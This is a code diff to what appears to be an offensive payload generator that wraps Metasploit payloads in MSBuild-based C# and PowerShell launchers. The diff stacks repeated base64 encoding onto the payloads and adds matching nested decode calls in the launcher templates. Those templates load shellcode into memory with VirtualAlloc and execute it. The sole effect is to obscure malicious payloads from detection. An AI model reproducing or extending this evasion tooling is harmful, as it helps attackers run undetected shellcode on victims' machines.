@@ -70,6 +70,11 @@ def encode_pshpayload(payload_file):
   psh_file = open(payload_file, "r")
   psh_payload = psh_file.read() + "for (;;){\n  Start-sleep 60\n}"
   psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
+  psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
+  psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
+  psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
+  psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
+  psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
   psh_file.close()
   return psh_payload
 
@@ -146,7 +151,7 @@ def generate_msbuild_nps_msf_payload():
                 string cmd = "%s";
 
                 PowerShell ps = PowerShell.Create();
-                ps.AddScript(Base64Decode(cmd));
+                ps.AddScript(Base64Decode(Base64Decode(Base64Decode(Base64Decode(Base64Decode(Base64Decode(cmd)))))));
 
                 Collection<PSObject> output = null;
                 try
@@ -222,6 +227,9 @@ def encode_csharppayload(payload_file):
   key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(20))
   cryptedMessage = ''.join(chr(ord(c)^ord(k)) for c,k in izip(raw_b64, cycle(key)))
   str_shellcode = base64.b64encode(cryptedMessage.encode('utf-8'))
+  str_shellcode = base64.b64encode(str_shellcode.encode('utf-8'))
+  str_shellcode = base64.b64encode(str_shellcode.encode('utf-8'))
+  str_shellcode = base64.b64encode(str_shellcode.encode('utf-8'))
   raw_file.close()
 
   # Create launcher class
@@ -251,7 +259,7 @@ public class ClassExample
     private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
     public void Execute() {
         string raw = @"%s";
-        byte[] shellcode = Convert.FromBase64String(xorIt("%s", Base64Decode(raw)));
+        byte[] shellcode = Convert.FromBase64String(xorIt("%s", Base64Decode(Base64Decode(Base64Decode(Base64Decode(raw))))));
         UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
         Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
         UInt32 oldProtect;
@@ -282,6 +290,9 @@ public class ClassExample
 }""" % (str_shellcode, key)
 
   launcher_b64 = base64.b64encode(launcher.encode('utf-8'))
+  launcher_b64 = base64.b64encode(launcher_b64.encode('utf-8'))
+  launcher_b64 = base64.b64encode(launcher_b64.encode('utf-8'))
+  launcher_b64 = base64.b64encode(launcher_b64.encode('utf-8'))
   csharp_payload = launcher_b64
   return launcher_b64
 
@@ -362,7 +373,7 @@ def generate_msbuild_nps_msf_csharp_payload():
                 parameters.GenerateExecutable = false;
                 parameters.GenerateInMemory = true;
                 parameters.IncludeDebugInformation = false;
-                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(Base64Decode(Base64Decode(Base64Decode(cmd)))));
                 Assembly assembly = results.CompiledAssembly;
                 object obj = assembly.CreateInstance("ClassExample");
                 obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
